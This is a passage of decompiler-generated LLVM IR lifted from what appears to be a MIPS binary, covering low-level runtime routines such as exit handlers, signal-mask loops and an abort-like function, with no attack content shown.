  uselistorder i32* %s2.global-to-local, { 3, 0, 2, 1, 4 }
  uselistorder i32* %s0.global-to-local, { 4, 0, 1, 3, 2, 5 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 6, 5, 7, 0, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_4067b4, { 1, 0 }
  uselistorder label %dec_label_pc_4067a8, { 1, 0 }
  uselistorder label %dec_label_pc_406788, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40673c, { 1, 0 }
  uselistorder label %dec_label_pc_4066c0, { 1, 0 }
}

define i32 @function_406800(i32 %arg1) local_unnamed_addr {
dec_label_pc_406800:
  %s1.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_406824 = load i32, i32* @global_var_449ba8.181, align 4
  %v2_40682c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_40682c, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v5_406834 = call i32 @function_406dac(i32 %v2_40682c, i32 %v3_406824)
  %v3_406848 = load i32, i32* bitcast (i32** @global_var_449ae4.214 to i32*), align 4
  %v2_40684c = call i32 @function_406da4(i32 %v3_406848)
  %v3_40685c = load i32, i32* bitcast (i32** @global_var_4499e8.216 to i32*), align 4
  store i32 %v3_40685c, i32* @v0, align 4
  %v1_40686c = icmp eq i32 %v3_40685c, 0
  br i1 %v1_40686c, label %dec_label_pc_406884, label %dec_label_pc_406870

dec_label_pc_406870:                              ; preds = %dec_label_pc_406800
  store i32 4221052, i32* @ra, align 4
  call void @__pseudo_call(i32 %v3_40685c)
  br label %dec_label_pc_406884

dec_label_pc_406884:                              ; preds = %dec_label_pc_406800, %dec_label_pc_406870
  %v3_40688c = call i32 @function_406dac(i32 %v2_40682c, i32 1)
  %v3_40689c = load i32, i32* @global_var_449c5c.217, align 4
  store i32 %v3_40689c, i32* @t9, align 4
  %v1_4068a4 = call i32 @function_406ce0()
  %v3_4068b4 = load i32, i32* @global_var_449af0.218, align 4
  %v1_4068bc = icmp eq i32 %v3_4068b4, 0
  br i1 %v1_4068bc, label %dec_label_pc_4068dc, label %dec_label_pc_4068c0

dec_label_pc_4068c0:                              ; preds = %dec_label_pc_406884
  %v1_4068cc = call i32 @unknown_0()
  br label %dec_label_pc_4068dc

dec_label_pc_4068dc:                              ; preds = %dec_label_pc_406884, %dec_label_pc_4068c0
  %v3_4068dc = load i32, i32* @global_var_449b0c.219, align 4
  store i32 %v3_4068dc, i32* @t9, align 4
  %v1_4068e4 = load i32, i32* %s1.global-to-local, align 4
  %v3_4068e4 = call i32 @function_407380(i32 %v1_4068e4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_406da4, { 13, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9, 8, 7 }
  uselistorder label %dec_label_pc_4068dc, { 1, 0 }
  uselistorder label %dec_label_pc_406884, { 1, 0 }
}

define i32 @function_4068f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4068f0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp6 = alloca i32, align 4
  %tmp8 = alloca i32, align 4
  %tmp9 = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %v1_4068f8 = load i32, i32* @t9, align 4
  %v2_4068f8 = add i32 %v1_4068f8, 307392
  store i32 %v2_4068f8, i32* @gp, align 4
  %v4_406910 = ptrtoint i32* %tmp6 to i32
  %v1_406918 = icmp eq i32 %arg1, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_406918, label %dec_label_pc_406afc, label %dec_label_pc_40691c

dec_label_pc_40691c:                              ; preds = %dec_label_pc_4068f0
  %v2_406924 = ptrtoint i32* %tmp8 to i32
  store i32 %v2_406924, i32* %a1.global-to-local, align 4
  %v0_406928.pre = load i32, i32* @v0, align 4
  br label %dec_label_pc_406928

dec_label_pc_406928:                              ; preds = %dec_label_pc_406928, %dec_label_pc_40691c
  %v0_406928 = phi i32 [ %v4_406934, %dec_label_pc_406928 ], [ %v0_406928.pre, %dec_label_pc_40691c ]
  %v1_406928 = add i32 %v0_406928, 8
  %v2_406928 = inttoptr i32 %v1_406928 to i32*
  store i32 0, i32* %v2_406928, align 4
  %v0_40692c = load i32, i32* %v1.global-to-local, align 4
  %v1_40692c = add i32 %v0_40692c, -1
  store i32 %v1_40692c, i32* %v1.global-to-local, align 4
  %v1_406930 = mul i32 %v1_40692c, 4
  %v1_406934 = icmp sgt i32 %v1_40692c, -1
  %v3_406934 = load i32, i32* %a1.global-to-local, align 4
  %v4_406934 = add i32 %v3_406934, %v1_406930
  store i32 %v4_406934, i32* %v0.global-to-local, align 4
  br i1 %v1_406934, label %dec_label_pc_406928, label %dec_label_pc_406938

dec_label_pc_406938:                              ; preds = %dec_label_pc_406928
  %v3_40693c = load i32, i32* @global_var_449bb4.194, align 4
  store i32 %v3_40693c, i32* @t9, align 4
  %v2_406940 = ptrtoint i32* %tmp9 to i32
  store i32 %arg1, i32* %tmp8, align 4
  store i32 %v2_406940, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40693c)
  store i32 %v2_4068f8, i32* @gp, align 4
  %v0_40695c = load i32, i32* %v0.global-to-local, align 4
  %v1_40695c = icmp slt i32 %v0_40695c, 0
  %v4_40695c = ptrtoint i32* %tmp10 to i32
  store i32 %v4_40695c, i32* %s0.global-to-local, align 4
  br i1 %v1_40695c, label %dec_label_pc_406b04, label %dec_label_pc_406960

dec_label_pc_406960:                              ; preds = %dec_label_pc_406938
  %v3_406964 = load i32, i32* @global_var_449b94.220, align 4
  store i32 %v3_406964, i32* @t9, align 4
  store i32 %v2_406940, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406964)
  store i32 %v2_4068f8, i32* @gp, align 4
  %v0_40697c = load i32, i32* %v0.global-to-local, align 4
  %v1_40697c = icmp eq i32 %v0_40697c, 0
  store i32 -1, i32* %v0.global-to-local, align 4
  br i1 %v1_40697c, label %dec_label_pc_406980, label %dec_label_pc_406b08

dec_label_pc_406980:                              ; preds = %dec_label_pc_406960
  %v3_406984 = load i32, i32* @global_var_449b34.195, align 4
  store i32 %v4_40695c, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406984)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  %v0_406998 = load i32, i32* %v0.global-to-local, align 4
  %v1_406998 = icmp eq i32 %v0_406998, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_406998, label %dec_label_pc_40699c, label %dec_label_pc_406980.dec_label_pc_406ac0_crit_edge

dec_label_pc_406980.dec_label_pc_406ac0_crit_edge: ; preds = %dec_label_pc_406980
  %v3_406ac4.pre = load i32, i32* @global_var_449bb0.222, align 4
  br label %dec_label_pc_406ac0

dec_label_pc_40699c:                              ; preds = %dec_label_pc_406980
  store i32 %v2_406924, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4069a8

dec_label_pc_4069a8:                              ; preds = %dec_label_pc_4069a8, %dec_label_pc_40699c
  %v0_4069a8 = phi i32 [ %v4_4069b4, %dec_label_pc_4069a8 ], [ 0, %dec_label_pc_40699c ]
  %v1_4069a8 = add i32 %v0_4069a8, 8
  %v2_4069a8 = inttoptr i32 %v1_4069a8 to i32*
  store i32 0, i32* %v2_4069a8, align 4
  %v0_4069ac = load i32, i32* %v1.global-to-local, align 4
  %v1_4069ac = add i32 %v0_4069ac, -1
  store i32 %v1_4069ac, i32* %v1.global-to-local, align 4
  %v1_4069b0 = mul i32 %v1_4069ac, 4
  %v1_4069b4 = icmp sgt i32 %v1_4069ac, -1
  %v3_4069b4 = load i32, i32* %a0.global-to-local, align 4
  %v4_4069b4 = add i32 %v3_4069b4, %v1_4069b0
  store i32 %v4_4069b4, i32* %v0.global-to-local, align 4
  br i1 %v1_4069b4, label %dec_label_pc_4069a8, label %dec_label_pc_4069b8

dec_label_pc_4069b8:                              ; preds = %dec_label_pc_4069a8
  %v3_4069bc = load i32, i32* @global_var_449bb4.194, align 4
  store i32 %v3_4069bc, i32* @t9, align 4
  store i32 %v2_406940, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4069bc)
  store i32 %v2_4068f8, i32* @gp, align 4
  %v0_4069d0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4069d0 = icmp slt i32 %v0_4069d0, 0
  store i32 18, i32* %a0.global-to-local, align 4
  br i1 %v1_4069d0, label %dec_label_pc_406b04, label %dec_label_pc_4069d4

dec_label_pc_4069d4:                              ; preds = %dec_label_pc_4069b8
  %v3_4069d8 = load i32, i32* @global_var_449c78.198, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4069d8)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  %v0_4069ec = load i32, i32* %v0.global-to-local, align 4
  %v1_4069ec = icmp sgt i32 %v0_4069ec, -1
  store i32 %v2_406924, i32* %s0.global-to-local, align 4
  br i1 %v1_4069ec, label %dec_label_pc_406a98, label %dec_label_pc_4069f0

dec_label_pc_4069f0:                              ; preds = %dec_label_pc_4069d4
  %v3_4069f4 = load i32, i32* @global_var_449abc.83, align 4
  call void @__pseudo_call(i32 %v3_4069f4)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_406a0c = load i32, i32* @global_var_449b94.220, align 4
  store i32 %v4_40695c, i32* %a1.global-to-local, align 4
  %v0_406a18 = load i32, i32* %v0.global-to-local, align 4
  %v1_406a18 = inttoptr i32 %v0_406a18 to i32*
  %v2_406a18 = load i32, i32* %v1_406a18, align 4
  store i32 %v0_406a18, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a0c)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_406a30 = inttoptr i32 %v0_406a18 to i32*
  store i32 %v2_406a18, i32* %v2_406a30, align 4
  %v0_406a48.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406a98

dec_label_pc_406a98:                              ; preds = %dec_label_pc_4069d4, %dec_label_pc_4069f0
  %v0_406a48 = phi i32 [ %v2_406924, %dec_label_pc_4069d4 ], [ %v0_406a48.pre, %dec_label_pc_4069f0 ]
  store i32 1, i32* %v0.global-to-local, align 4
  %v3_406a44 = load i32, i32* @global_var_449bb0.222, align 4
  store i32 %v0_406a48, i32* %a0.global-to-local, align 4
  store i32 %v0_406a48, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a44)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  %v3_406a5c = load i32, i32* @global_var_449abc.83, align 4
  call void @__pseudo_call(i32 %v3_406a5c)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  store i32 %v4_40695c, i32* %a1.global-to-local, align 4
  %v3_406a74 = load i32, i32* @global_var_449b94.220, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v0_406a80 = load i32, i32* %v0.global-to-local, align 4
  %v1_406a80 = inttoptr i32 %v0_406a80 to i32*
  %v2_406a80 = load i32, i32* %v1_406a80, align 4
  store i32 %v2_406a80, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a74)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  %v2_406a94 = inttoptr i32 %v0_406a80 to i32*
  store i32 %v2_406a80, i32* %v2_406a94, align 4
  %v0_406a98 = load i32, i32* %gp.global-to-local, align 4
  %v1_406a98 = add i32 %v0_406a98, -32284
  %v2_406a98 = inttoptr i32 %v1_406a98 to i32*
  %v3_406a98 = load i32, i32* %v2_406a98, align 4
  store i32 %v4_40695c, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a98)
  store i32 %v2_4068f8, i32* %gp.global-to-local, align 4
  %v0_406ab0 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406ab0, i32* %a0.global-to-local, align 4
  %v3_406ab4 = load i32, i32* @global_var_449bb0.222, align 4
  store i32 %v0_406ab0, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_406ac0

dec_label_pc_406ac0:                              ; preds = %dec_label_pc_406980.dec_label_pc_406ac0_crit_edge, %dec_label_pc_406a98
  %v3_406ac4 = phi i32 [ %v3_406ac4.pre, %dec_label_pc_406980.dec_label_pc_406ac0_crit_edge ], [ %v3_406ab4, %dec_label_pc_406a98 ]
  store i32 %v2_406924, i32* %a0.global-to-local, align 4
  store i32 %v3_406ac4, i32* @t9, align 4
  store i32 %v2_406924, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406ac4)
  store i32 %v2_4068f8, i32* @gp, align 4
  %v0_406ad8 = load i32, i32* %v0.global-to-local, align 4
  %v1_406adc = icmp eq i32 %v0_406ad8, 0
  store i32 499974144, i32* %v1.global-to-local, align 4
  br i1 %v1_406adc, label %dec_label_pc_406afc, label %dec_label_pc_406ae0

dec_label_pc_406ae0:                              ; preds = %dec_label_pc_406ac0
  %v3_406af0 = load i32, i32* %tmp8, align 4
  store i32 %v3_406af0, i32* %v1.global-to-local, align 4
  store i32 %v3_406af0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406afc

dec_label_pc_406afc:                              ; preds = %dec_label_pc_406ac0, %dec_label_pc_4068f0, %dec_label_pc_406ae0
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406b04

dec_label_pc_406b04:                              ; preds = %dec_label_pc_4069b8, %dec_label_pc_406938, %dec_label_pc_406afc
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406b08

dec_label_pc_406b08:                              ; preds = %dec_label_pc_406960, %dec_label_pc_406b04
  store i32 %v4_406910, i32* @s0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v3_406ac4, { 1, 0 }
  uselistorder i32 %v0_406a48, { 1, 0 }
  uselistorder i32 %v4_4069b4, { 1, 0 }
  uselistorder i32 %v1_4069ac, { 1, 0, 2 }
  uselistorder i32 %v4_40695c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_406934, { 1, 0 }
  uselistorder i32 %v1_40692c, { 1, 0, 2 }
  uselistorder i32 %v2_406924, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_4068f8, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12 }
  uselistorder i32* %tmp8, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* @global_var_449bb0.222, { 1, 2, 0 }
  uselistorder i32* @gp, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406b08, { 1, 0 }
  uselistorder label %dec_label_pc_406b04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406afc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406ac0, { 1, 0 }
  uselistorder label %dec_label_pc_406a98, { 1, 0 }
}

define i32 @function_406b30(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b30:
  %v1_406b48 = icmp ult i32 %arg1, 150
  %v1_406b4c = icmp eq i1 %v1_406b48, false
  br i1 %v1_406b4c, label %dec_label_pc_406b80, label %dec_label_pc_406b50

dec_label_pc_406b50:                              ; preds = %dec_label_pc_406b30
  %v3_406b4c = mul i32 %arg1, 4
  %v1_406b38 = load i32, i32* @t9, align 4
  %v2_406b38 = add i32 %v1_406b38, 306816
  %v2_406b60 = add i32 %v3_406b4c, ptrtoint (i32* @global_var_409590.226 to i32)
  %v1_406b64 = inttoptr i32 %v2_406b60 to i32*
  %v2_406b64 = load i32, i32* %v1_406b64, align 4
  %v2_406b6c = add i32 %v2_406b64, %v2_406b38
  call void @__pseudo_branch(i32 %v2_406b6c)
  br label %dec_label_pc_406b80

dec_label_pc_406b80:                              ; preds = %dec_label_pc_406b30, %dec_label_pc_406b50
  %v3_406b80 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_406b80, i32* @t9, align 4
  %v1_406b88 = call i32 @function_4056e0()
  %v2_406ba0 = inttoptr i32 %v1_406b88 to i32*
  store i32 22, i32* %v2_406ba0, align 4
  %v3_406bd0 = load i32, i32* @global_var_449c6c.228, align 4
  store i32 %v3_406bd0, i32* @t9, align 4
  %v5_406bd8 = call i32 @function_407880(i32 6)
  %v3_406c30 = load i32, i32* @global_var_449c50.229, align 4
  store i32 %v3_406c30, i32* @t9, align 4
  %v4_406c38 = call i32 @function_4073d0(i32 1, %timespec* null)
  %v1_406c44 = icmp sgt i32 %v4_406c38, -1
  br i1 %v1_406c44, label %dec_label_pc_406c68, label %dec_label_pc_406c48

dec_label_pc_406c48:                              ; preds = %dec_label_pc_406b80
  br label %dec_label_pc_406c68

dec_label_pc_406c68:                              ; preds = %dec_label_pc_406b80, %dec_label_pc_406c48
  ret i32 32767

; uselistorder directives
  uselistorder i32 150, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406c68, { 1, 0 }
  uselistorder label %dec_label_pc_406b80, { 1, 0 }
}

define i32 @function_406ce0() local_unnamed_addr {
dec_label_pc_406ce0:
  %s0.global-to-local = alloca i32, align 4
  %v1_406ce8 = load i32, i32* @t9, align 4
  %v0_406cf0 = load i32, i32* @ra, align 4
  %v0_406cf4 = load i32, i32* @s0, align 4
  %v1_406cfc = add i32 %v1_406ce8, 273680
  %v2_406cfc = inttoptr i32 %v1_406cfc to i32*
  %v3_406cfc = load i32, i32* %v2_406cfc, align 4
  %v3_406d00 = load i32, i32* @global_var_4499f0, align 4
  %v2_406d08 = sub i32 %v3_406cfc, %v3_406d00
  %v1_406d10 = sdiv i32 %v2_406d08, 4
  store i32 %v1_406d10, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406d14

dec_label_pc_406d14:                              ; preds = %dec_label_pc_406d14, %dec_label_pc_406ce0
  %v0_406d14 = phi i32 [ %v2_406d34, %dec_label_pc_406d14 ], [ %v3_406d00, %dec_label_pc_406ce0 ]
  %v1_406d14 = inttoptr i32 %v0_406d14 to i32*
  %v2_406d14 = load i32, i32* %v1_406d14, align 4
  call void @__pseudo_call(i32 %v2_406d14)
  %v0_406d28 = load i32, i32* %s0.global-to-local, align 4
  %v1_406d28 = add i32 %v0_406d28, -1
  store i32 %v1_406d28, i32* %s0.global-to-local, align 4
  %v3_406d2c = load i32, i32* @global_var_4499f0, align 4
  %v1_406d30 = mul i32 %v1_406d28, 4
  %v2_406d34 = add i32 %v3_406d2c, %v1_406d30
  %v2_406d3c = icmp eq i32 %v0_406d28, 0
  br i1 %v2_406d3c, label %dec_label_pc_406d40, label %dec_label_pc_406d14

dec_label_pc_406d40:                              ; preds = %dec_label_pc_406d14
  %v1_406d44 = add i32 %v1_406ce8, 273684
  %v2_406d44 = inttoptr i32 %v1_406d44 to i32*
  %v3_406d44 = load i32, i32* %v2_406d44, align 4
  %v1_406d4c = inttoptr i32 %v3_406d44 to i32*
  %v2_406d4c = load i32, i32* %v1_406d4c, align 4
  %v1_406d54 = icmp eq i32 %v2_406d4c, 0
  br i1 %v1_406d54, label %dec_label_pc_406d6c, label %dec_label_pc_406d58

dec_label_pc_406d58:                              ; preds = %dec_label_pc_406d40
  call void @__pseudo_call(i32 %v2_406d4c)
  br label %dec_label_pc_406d6c

dec_label_pc_406d6c:                              ; preds = %dec_label_pc_406d40, %dec_label_pc_406d58
  %v3_406d6c = load i32, i32* bitcast (i32** @global_var_4499f8.233 to i32*), align 4
  %v1_406d7c = icmp eq i32 %v3_406d6c, 0
  br i1 %v1_406d7c, label %dec_label_pc_406d6c.dec_label_pc_406d94_crit_edge, label %dec_label_pc_406d80

dec_label_pc_406d6c.dec_label_pc_406d94_crit_edge: ; preds = %dec_label_pc_406d6c
  br label %dec_label_pc_406d94

dec_label_pc_406d80:                              ; preds = %dec_label_pc_406d6c
  store i32 %v0_406cf4, i32* %s0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_406d6c)
  br label %dec_label_pc_406d94

dec_label_pc_406d94:                              ; preds = %dec_label_pc_406d6c.dec_label_pc_406d94_crit_edge, %dec_label_pc_406d80
  store i32 %v0_406cf0, i32* @ra, align 4
  store i32 %v0_406cf4, i32* @s0, align 4
  ret i32 %v3_406d6c

; uselistorder directives
  uselistorder i32 %v3_406d6c, { 1, 0, 2 }
  uselistorder i32 %v0_406cf4, { 1, 0 }
  uselistorder label %dec_label_pc_406d94, { 1, 0 }
  uselistorder label %dec_label_pc_406d6c, { 1, 0 }
}

define i32 @function_406da4(i32 %arg1) local_unnamed_addr {
dec_label_pc_406da4:
  ret i32 0
}

define i32 @function_406dac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406dac:
  %v1_406dac = load i32, i32* @v0, align 4
  ret i32 %v1_406dac
}

define i32 @function_406db4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406db4:
  store i32 %arg1, i32* @a0, align 4
  %v3_406dd4 = load i32, i32* @global_var_4499dc.186, align 4
  store i32 %v3_406dd4, i32* @t9, align 4
  store i32 %arg2, i32* @s1, align 4
  store i32 1, i32* @a1, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_406de0 = call i32 @function_404bc0()
  %v2_406df0 = icmp eq i32 %v2_406de0, -1
  br i1 %v2_406df0, label %dec_label_pc_406df4, label %dec_label_pc_406e28

dec_label_pc_406df4:                              ; preds = %dec_label_pc_406db4
  %v3_406dfc = load i32, i32* @global_var_4499d4.179, align 4
  store i32 %v3_406dfc, i32* @t9, align 4
  %v1_406e04 = load i32, i32* @s1, align 4
  store i32 %v1_406e04, i32* @a1, align 4
  %v6_406e04 = call i32 @function_404fb0(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_4097f0.234, i32 0, i32 0))
  %v1_406e10 = load i32, i32* @s0, align 4
  %v2_406e10 = icmp eq i32 %v6_406e04, %v1_406e10
  br i1 %v2_406e10, label %dec_label_pc_406e28, label %dec_label_pc_406e14

dec_label_pc_406e14:                              ; preds = %dec_label_pc_406df4
  %v3_406e18 = load i32, i32* @global_var_449b10.235, align 4
  store i32 %v3_406e18, i32* @t9, align 4
  %v1_406e20 = call i32 @function_407f30()
  br label %dec_label_pc_406e28

dec_label_pc_406e28:                              ; preds = %dec_label_pc_406db4, %dec_label_pc_406df4, %dec_label_pc_406e14
  %v4_406e34 = phi i32 [ %v2_406de0, %dec_label_pc_406db4 ], [ %v6_406e04, %dec_label_pc_406df4 ], [ %v1_406e20, %dec_label_pc_406e14 ]
  ret i32 %v4_406e34

; uselistorder directives
  uselistorder label %dec_label_pc_406e28, { 2, 1, 0 }
}

define i32 @function_406e3c() local_unnamed_addr {
dec_label_pc_406e3c:
  %v3_406e5c = load i32, i32* @global_var_449d34.236, align 4
  %v1_406e64 = icmp eq i32 %v3_406e5c, 0
  br i1 %v1_406e64, label %dec_label_pc_406e68, label %dec_label_pc_406eb8

dec_label_pc_406e68:                              ; preds = %dec_label_pc_406e3c
  store i32 1, i32* @global_var_449d34.236, align 4
  %v3_406e70 = load i32, i32* @global_var_449ad0, align 4
  %v2_406e78 = inttoptr i32 %v3_406e70 to i32*
  store i32 4096, i32* %v2_406e78, align 4
  %v3_406e7c = load i32, i32* @global_var_449b7c.237, align 4
  %v1_406e84 = icmp eq i32 %v3_406e7c, 0
  br i1 %v1_406e84, label %dec_label_pc_406e9c, label %dec_label_pc_406e88

dec_label_pc_406e88:                              ; preds = %dec_label_pc_406e68
  %v1_406e8c = call i32 @unknown_0()
  br label %dec_label_pc_406e9c

dec_label_pc_406e9c:                              ; preds = %dec_label_pc_406e68, %dec_label_pc_406e88
  %v3_406e9c = load i32, i32* @global_var_449ab4.238, align 4
  %v1_406ea4 = icmp eq i32 %v3_406e9c, 0
  br i1 %v1_406ea4, label %dec_label_pc_406eb8, label %dec_label_pc_406ea8

dec_label_pc_406ea8:                              ; preds = %dec_label_pc_406e9c
  %v4_406eb0 = call i32 @unknown_0()
  br label %dec_label_pc_406eb8

dec_label_pc_406eb8:                              ; preds = %dec_label_pc_406e3c, %dec_label_pc_406e9c, %dec_label_pc_406ea8
  %v4_406ec0 = phi i32 [ 1, %dec_label_pc_406e3c ], [ 0, %dec_label_pc_406e9c ], [ %v4_406eb0, %dec_label_pc_406ea8 ]
  ret i32 %v4_406ec0

; uselistorder directives
  uselistorder label %dec_label_pc_406eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_406e9c, { 1, 0 }
}

define i32 @function_406ec8(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406ec8:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %a2.global-to-local, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %v1_406ed0 = load i32, i32* @t9, align 4
  %v2_406ed0 = add i32 %v1_406ed0, 305896
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_406ef8 = mul i32 %arg2, 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  %v2_406f04 = add i32 %tmp, %v1_406ef8
  store i32 %v2_406f04, i32* %a2.global-to-local, align 4
  %v3_406f08 = load i32, i32* bitcast (i32** @global_var_449c44.239 to i32*), align 4
  %v3_406f0c = load i32, i32* bitcast (i32** @global_var_449bdc.241 to i32*), align 4
  store i32 %v3_406f0c, i32* %s0.global-to-local, align 4
  %v2_406f10 = inttoptr i32 %v3_406f08 to i32*
  store i32 %arg7, i32* %v2_406f10, align 4
  %v3_406f14 = load i32, i32* bitcast (i32** @global_var_4499f8.233 to i32*), align 4
  store i32 %v3_406f14, i32* %v0.global-to-local, align 4
  store i32 %arg6, i32* %v1.global-to-local, align 4
  %v0_406f20 = load i32, i32* %a2.global-to-local, align 4
  %v1_406f20 = add i32 %v0_406f20, 4
  store i32 %v1_406f20, i32* %a1.global-to-local, align 4
  %v2_406f24 = inttoptr i32 %v3_406f14 to i32*
  store i32 %arg6, i32* %v2_406f24, align 4
  %v0_406f28 = load i32, i32* %a1.global-to-local, align 4
  %v1_406f28 = load i32, i32* %s0.global-to-local, align 4
  %v2_406f28 = inttoptr i32 %v1_406f28 to i32*
  store i32 %v0_406f28, i32* %v2_406f28, align 4
  %v0_406f2c = load i32, i32* %s2.global-to-local, align 4
  %v1_406f2c = inttoptr i32 %v0_406f2c to i32*
  %v2_406f2c = load i32, i32* %v1_406f2c, align 4
  store i32 %v2_406f2c, i32* %v0.global-to-local, align 4
  store i32 %arg1, i32* %s5.global-to-local, align 4
  %v0_406f34 = load i32, i32* %a1.global-to-local, align 4
  %v2_406f34 = icmp eq i32 %v0_406f34, %v2_406f2c
  store i32 %arg4, i32* %s3.global-to-local, align 4
  br i1 %v2_406f34, label %dec_label_pc_406f38, label %dec_label_pc_406f40

dec_label_pc_406f38:                              ; preds = %dec_label_pc_406ec8
  %v0_406f3c = load i32, i32* %a2.global-to-local, align 4
  %v1_406f3c = load i32, i32* %s0.global-to-local, align 4
  %v2_406f3c = inttoptr i32 %v1_406f3c to i32*
  store i32 %v0_406f3c, i32* %v2_406f3c, align 4
  br label %dec_label_pc_406f40

dec_label_pc_406f40:                              ; preds = %dec_label_pc_406ec8, %dec_label_pc_406f38
  %v2_406f44 = ptrtoint i32* %stack_var_-152 to i32
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 120, i32* %a2.global-to-local, align 4
  %v5_406f4c = call i32 @function_405770(i32* nonnull %stack_var_-152, i32 0, i32 120)
  store i32 %v5_406f4c, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v2_406f58 = load i32, i32* bitcast (i32** @global_var_449bdc.241 to i32*), align 4
  store i32 %v2_406f58, i32* %v1.global-to-local, align 4
  %v0_406f64.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_406f64

dec_label_pc_406f64:                              ; preds = %dec_label_pc_406f64, %dec_label_pc_406f40
  %v0_406f64 = phi i32 [ %v3_406f70, %dec_label_pc_406f64 ], [ %v0_406f64.pre, %dec_label_pc_406f40 ]
  store i32 %v0_406f64, i32* %v1.global-to-local, align 4
  %v1_406f68 = inttoptr i32 %v0_406f64 to i32*
